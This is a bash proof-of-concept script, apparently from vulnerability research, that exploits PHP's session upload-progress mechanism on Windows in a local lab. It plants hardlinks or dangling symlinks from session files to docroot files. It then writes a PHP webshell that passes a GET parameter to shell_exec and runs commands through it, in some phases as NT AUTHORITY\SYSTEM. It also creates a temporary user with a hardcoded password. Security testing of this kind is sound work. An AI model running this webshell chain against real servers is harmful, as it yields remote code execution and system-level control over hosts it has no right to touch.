#!/bin/bash
# wp4_deploy.sh - Finding C pass 4, deployment-context phases:
#   B   CreateHardLink target-access matrix (filtered token)
#   X1  unpriv (filtered-token) HARDLINK plant -> H4 webshell chain -> RCE
#   X3  unpriv (filtered-token, Dev Mode) DANGLING-SYMLINK plant -> W6 chain -> RCE
#   X2  server as NT AUTHORITY\SYSTEM (schtasks, XAMPP-service shape) -> chain -> RCE
#   X4  plant by a SECOND STANDARD-USER principal (wp4ten) -> chain -> RCE
#   H10 cross-volume hardlink negative (if a second volume exists)
WP4=/c/Users/andre/Downloads/php2shell-claude
WP3=$WP4/wp3
PY=/c/Python313/python
UPCLIENT=$WP4/wp2/wp2_upclient.py
PHP85=$WP3/winphp/8512/php.exe
W4=$WP4/wp4
REC=$W4/receipts
SRVPID=""

hexkey() { "$PY" -c 'import sys;print(sys.argv[1].encode().hex())' "$1"; }
PAYLOAD='<?php echo "WP4_RCE_OK[".shell_exec($_GET["c"])."]"; ?>'

snap() {
  local f="$1"
  if [ -L "$f" ]; then echo "SYMLINK->$(readlink "$f")"
  elif [ -e "$f" ]; then echo "EXISTS size=$(stat -c %s "$f") nlink=$(stat -c %h "$f") head=$(head -c 60 "$f" | tr -d '\0' | tr '\n' ' ')"
  else echo "MISSING"; fi
}

plant_unpriv() { # $1=hardlink|symlink $2=link(msys) $3=target(msys) - filtered token
  local mode="$1" l=$(cygpath -w "$2") t=$(cygpath -w "$3")
  rm -f "$2"
  "$PY" "$W4/wp4_plant.py" "$mode" "$l" "$t"
  local i
  for i in $(seq 1 80); do
    if [ "$mode" = hardlink ] && [ -e "$2" ]; then return 0; fi
    if [ "$mode" = symlink ] && [ -L "$2" ]; then return 0; fi
    sleep 0.15
  done
  echo "PLANT-FAILED $mode $2"; return 1
}

start_server() { # $1=lab $2=port $3=cleanup
  local lab="$1" port="$2" cleanup="$3"
  local drive=$(cygpath -m "$lab")
  mkdir -p "$lab/sess" "$lab/tmp" "$lab/docroot"
  cat > "$lab/php.ini" <<EOF
session.save_handler = files
session.save_path = "$drive/sess"
session.serialize_handler = php
session.use_strict_mode = 0
session.upload_progress.enabled = 1
session.upload_progress.prefix = "upload_progress_"
session.upload_progress.freq = 1
session.upload_progress.min_freq = 0
session.upload_progress.cleanup = $cleanup
session.gc_probability = 0
display_errors = 1
log_errors = 1
error_reporting = E_ALL
post_max_size = 64M
upload_max_filesize = 64M
max_file_uploads = 64
memory_limit = 1024M
upload_tmp_dir = "$drive/tmp"
EOF
  cp "$WP3/docroot/up.php" "$lab/docroot/up.php"
  "$PHP85" -c "$lab/php.ini" -S 127.0.0.1:$port -t "$lab/docroot" \
    >> "$lab/server_out.log" 2>> "$lab/server_err.log" &
  SRVPID=$!
  local i
  for i in $(seq 1 80); do
    curl -s -o /dev/null --max-time 2 "http://127.0.0.1:$port/up.php" && return 0
    sleep 0.25
  done
  echo "SERVER-START-FAILED port=$port"; return 1
}

stop_server() {
  if [ -n "$SRVPID" ]; then
    kill "$SRVPID" 2>/dev/null; sleep 1.2
    kill -0 "$SRVPID" 2>/dev/null && kill -9 "$SRVPID" 2>/dev/null
    sleep 0.3
  fi
  SRVPID=""
}

shot() { local port="$1" mode="$2" sid="$3" key="$4"; shift 4
  "$PY" "$UPCLIENT" "$port" "$mode" "$sid" --key "$key" --timeout 60 "$@" 2>&1; }

owner() { powershell -NoProfile -Command "(Get-Acl '$(cygpath -w "$1")').Owner" 2>/dev/null | tr -d '\r'; }

cleanup_end() {
  stop_server
  MSYS_NO_PATHCONV=1 schtasks /end /tn WP4SYS  >/dev/null 2>&1
  MSYS_NO_PATHCONV=1 schtasks /delete /tn WP4SYS /f >/dev/null 2>&1
  MSYS_NO_PATHCONV=1 schtasks /end /tn WP4TEN  >/dev/null 2>&1
  MSYS_NO_PATHCONV=1 schtasks /delete /tn WP4TEN /f >/dev/null 2>&1
  MSYS_NO_PATHCONV=1 /c/Windows/System32/net.exe user wp4ten /delete >/dev/null 2>&1
}
trap cleanup_end EXIT

want() { [ "${PHASE:-all}" = "all" ] || [ "${PHASE:-all}" = "$1" ]; }

if want b; then
echo "###### PHASE B: CreateHardLink target-access matrix (filtered token) ######"
AL=$W4/access_lab
rm -rf "$AL"; mkdir -p "$AL"
printf 'data' > "$AL/t_normal.txt"
printf 'data' > "$AL/t_roattr.txt";  MSYS_NO_PATHCONV=1 attrib +R "$(cygpath -w "$AL/t_roattr.txt")"
printf 'data' > "$AL/t_denyw.txt";   MSYS_NO_PATHCONV=1 icacls "$(cygpath -w "$AL/t_denyw.txt")" /deny "andre:(WD,AD)" >/dev/null
printf 'data' > "$AL/t_rxonly.txt";  MSYS_NO_PATHCONV=1 icacls "$(cygpath -w "$AL/t_rxonly.txt")" /inheritance:r /grant "andre:(RX)" /grant "Administrators:(F)" /grant "SYSTEM:(F)" >/dev/null
runas /trustlevel:0x20000 "cmd /c C:\\Users\\andre\\Downloads\\php2shell-claude\\wp4\\wp4_access.bat"
sleep 5
cat "$REC/access_matrix.log"
fi

if want x1; then
echo "###### PHASE X1+X3: unpriv plants, andre-server (interactive-admin context) ######"
OUT=$REC/x1_x3_unpriv_chain.log
LAB=$W4/win_lab/x1
rm -rf "$LAB"
: > "$OUT"
start_server "$LAB" 18815 0 || exit 1

# X1: filtered-token hardlink plant -> webshell into empty docroot file
sid=x1aaaaaaaaaaaaaaaaaaaaaaaaaa
: > "$LAB/docroot/empty.php"
plant_unpriv hardlink "$LAB/sess/sess_$sid" "$LAB/docroot/empty.php" || true
echo "--- X1 plant (filtered token): $(snap "$LAB/sess/sess_$sid")" | tee -a "$OUT"
echo "link owner: $(owner "$LAB/sess/sess_$sid")" | tee -a "$OUT"
shot 18815 full "$sid" "$(hexkey "$PAYLOAD")" > "$REC/x1_client.log"
echo "shell after: $(snap "$LAB/docroot/empty.php")" | tee -a "$OUT"
echo "shell owner: $(owner "$LAB/docroot/empty.php")" | tee -a "$OUT"
cp "$LAB/docroot/empty.php" "$REC/x1_shell.php" 2>/dev/null
echo "--- X1b GET /empty.php?c=whoami" | tee -a "$OUT"
curl -s --max-time 10 "http://127.0.0.1:18815/empty.php?c=whoami" | head -c 120 | tee -a "$OUT"; echo | tee -a "$OUT"

# X3: filtered-token DANGLING-SYMLINK plant (Dev Mode) -> W6 arbitrary-create chain
sid=x3aaaaaaaaaaaaaaaaaaaaaaaaaa
rm -f "$LAB/docroot/shell9.php" "$LAB/sess/sess_$sid"
plant_unpriv symlink "$LAB/sess/sess_$sid" "$LAB/docroot/shell9.php" || true
echo "--- X3 plant (filtered token, Dev Mode): $(snap "$LAB/sess/sess_$sid")" | tee -a "$OUT"
shot 18815 full "$sid" "$(hexkey "$PAYLOAD")" > "$REC/x3_client.log"
echo "shell after: $(snap "$LAB/docroot/shell9.php")" | tee -a "$OUT"
echo "--- X3b GET /shell9.php?c=whoami" | tee -a "$OUT"
curl -s --max-time 10 "http://127.0.0.1:18815/shell9.php?c=whoami" | head -c 120 | tee -a "$OUT"; echo | tee -a "$OUT"
stop_server
fi

if want x2; then
echo "###### PHASE X2: server as NT AUTHORITY\\SYSTEM (service context) ######"
OUT=$REC/x2_system_chain.log
LAB=$W4/win_lab/sys8512
rm -rf "$LAB"; mkdir -p "$LAB/sess" "$LAB/tmp" "$LAB/docroot"
drive=$(cygpath -m "$LAB")
cat > "$LAB/php.ini" <<EOF
session.save_handler = files
session.save_path = "$drive/sess"
session.serialize_handler = php
session.use_strict_mode = 0
session.upload_progress.enabled = 1
session.upload_progress.prefix = "upload_progress_"
session.upload_progress.freq = 1
session.upload_progress.min_freq = 0
session.upload_progress.cleanup = 0
session.gc_probability = 0
display_errors = 1
log_errors = 1
error_reporting = E_ALL
post_max_size = 64M
upload_max_filesize = 64M
max_file_uploads = 64
memory_limit = 1024M
upload_tmp_dir = "$drive/tmp"
EOF
cp "$WP3/docroot/up.php" "$LAB/docroot/up.php"
: > "$OUT"
MSYS_NO_PATHCONV=1 schtasks /create /tn WP4SYS /tr "cmd /c C:\\Users\\andre\\Downloads\\php2shell-claude\\wp4\\wp4_sys.bat" /sc once /st 23:59 /ru SYSTEM /f
MSYS_NO_PATHCONV=1 schtasks /run /tn WP4SYS
up=NO
for i in $(seq 1 60); do
  curl -s -o /dev/null --max-time 2 "http://127.0.0.1:18816/up.php" && { up=YES; break; }
  sleep 0.5
done
echo "SYSTEM server up: $up" | tee -a "$OUT"
if [ "$up" = YES ]; then
  sid=x2aaaaaaaaaaaaaaaaaaaaaaaaaa
  : > "$LAB/docroot/sys.php"
  plant_unpriv hardlink "$LAB/sess/sess_$sid" "$LAB/docroot/sys.php" || true
  echo "--- X2 plant (filtered token): $(snap "$LAB/sess/sess_$sid")" | tee -a "$OUT"
  echo "target owner: $(owner "$LAB/docroot/sys.php")  (file is andre-owned; server is SYSTEM = cross-owner write)" | tee -a "$OUT"
  shot 18816 full "$sid" "$(hexkey "$PAYLOAD")" > "$REC/x2_client.log"
  echo "shell after: $(snap "$LAB/docroot/sys.php")" | tee -a "$OUT"
  cp "$LAB/docroot/sys.php" "$REC/x2_shell.php" 2>/dev/null
  echo "--- X2b GET /sys.php?c=whoami (expect nt authority\\system)" | tee -a "$OUT"
  curl -s --max-time 10 "http://127.0.0.1:18816/sys.php?c=whoami" | head -c 120 | tee -a "$OUT"; echo | tee -a "$OUT"
fi
MSYS_NO_PATHCONV=1 schtasks /end /tn WP4SYS
MSYS_NO_PATHCONV=1 schtasks /delete /tn WP4SYS /f
fi

if want x4; then
echo "###### PHASE X4: plant by second STANDARD-USER principal (wp4ten) ######"
OUT=$REC/x4_tenant_chain.log
LAB=$W4/win_lab/x4
rm -rf "$LAB"; mkdir -p "$LAB/sess" "$LAB/tmp" "$LAB/docroot"
: > "$OUT"
TENPW='Wp4!Lab2026#x'
MSYS_NO_PATHCONV=1 /c/Windows/System32/net.exe user wp4ten "$TENPW" /add
MSYS_NO_PATHCONV=1 /c/Windows/System32/net.exe localgroup Administrators wp4ten /delete >/dev/null 2>&1   # ensure NOT admin
echo "wp4ten exists: $(MSYS_NO_PATHCONV=1 /c/Windows/System32/net.exe user wp4ten 2>&1 | head -2 | tail -1)" | tee -a "$OUT"
start_server "$LAB" 18817 0 || exit 1
sid=x4aaaaaaaaaaaaaaaaaaaaaaaaaa
: > "$LAB/docroot/empty4.php"
# shared-dir simulation: tenant gets Modify on save_path dir and on the target file
MSYS_NO_PATHCONV=1 icacls "$(cygpath -w "$LAB/sess")" /grant "wp4ten:(OI)(CI)M" >/dev/null
MSYS_NO_PATHCONV=1 icacls "$(cygpath -w "$LAB/docroot/empty4.php")" /grant "wp4ten:M" >/dev/null
LW=$(cygpath -w "$LAB/sess/sess_$sid"); TW=$(cygpath -w "$LAB/docroot/empty4.php")
TENLOG=$(cygpath -w "$LAB/sess/wp4ten_plant.log")
TENBAT='C:\Users\Public\wp4_ten.bat'
cat > /c/Users/Public/wp4_ten.bat <<EOF
@echo off
whoami > "$TENLOG" 2>&1
mklink /H "$LW" "$TW" >> "$TENLOG" 2>&1
echo MKLINK_RC=%ERRORLEVEL% >> "$TENLOG"
EOF
# Launch as wp4ten via interactive-logon token (Start-Process -Credential);
# schtasks /ru fails for standard users (no batch-logon right on Home).
powershell -NoProfile -Command "try { \$pw = ConvertTo-SecureString '$TENPW' -AsPlainText -Force; \$c = New-Object System.Management.Automation.PSCredential('.\wp4ten', \$pw); Start-Process -FilePath 'C:\\Windows\\System32\\cmd.exe' -ArgumentList '/c','$TENBAT' -WorkingDirectory 'C:\\Windows' -Credential \$c -ErrorAction Stop; 'SP-OK' } catch { 'SP-ERR: ' + \$_.Exception.Message }"
planted=NO
for i in $(seq 1 60); do [ -e "$LAB/sess/sess_$sid" ] && { planted=YES; break; }; sleep 0.5; done
sleep 1
echo "sess dir after plant attempt: $(ls "$LAB/sess/" 2>/dev/null | tr '\n' ' ')" | tee -a "$OUT"
cp "$LAB/sess/wp4ten_plant.log" "$REC/wp4ten_plant.log" 2>/dev/null
cat "$REC/wp4ten_plant.log" 2>/dev/null | tee -a "$OUT"
echo "--- X4 plant by wp4ten (standard user): planted=$planted $(snap "$LAB/sess/sess_$sid")" | tee -a "$OUT"
echo "link owner: $(owner "$LAB/sess/sess_$sid")" | tee -a "$OUT"
if [ "$planted" = YES ]; then
  shot 18817 full "$sid" "$(hexkey "$PAYLOAD")" > "$REC/x4_client.log"
  echo "shell after: $(snap "$LAB/docroot/empty4.php")" | tee -a "$OUT"
  echo "shell owner: $(owner "$LAB/docroot/empty4.php")" | tee -a "$OUT"
  cp "$LAB/docroot/empty4.php" "$REC/x4_shell.php" 2>/dev/null
  echo "--- X4b GET /empty4.php?c=whoami" | tee -a "$OUT"
  curl -s --max-time 10 "http://127.0.0.1:18817/empty4.php?c=whoami" | head -c 120 | tee -a "$OUT"; echo | tee -a "$OUT"
fi
stop_server
MSYS_NO_PATHCONV=1 schtasks /end /tn WP4TEN
MSYS_NO_PATHCONV=1 schtasks /delete /tn WP4TEN /f
MSYS_NO_PATHCONV=1 /c/Windows/System32/net.exe user wp4ten /delete >/dev/null 2>&1
echo "wp4ten removed: $(MSYS_NO_PATHCONV=1 /c/Windows/System32/net.exe user wp4ten 2>&1 | head -1)" | tee -a "$OUT"
fi

echo "###### PHASE H10: cross-volume hardlink (negative, if 2nd volume) ######"
VOLS=$(powershell -NoProfile -Command "Get-PSDrive -PSProvider FileSystem | ForEach-Object { \$_.Name }" | tr -d '\r')
echo "volumes: $VOLS"
for v in $VOLS; do
  if [ "$v" != "C" ] && [ -d "/$v/" ]; then
    printf 'x' > "/$v/wp4_h10_target.txt" 2>/dev/null || continue
    cmd //c "mklink /H C:\\Users\\andre\\Downloads\\php2shell-claude\\wp4\\h10_link.txt ${v}:\\wp4_h10_target.txt" 2>&1 | head -2
    rm -f "/$v/wp4_h10_target.txt" "$W4/h10_link.txt"
    break
  fi
done
echo "done. receipts: $REC"
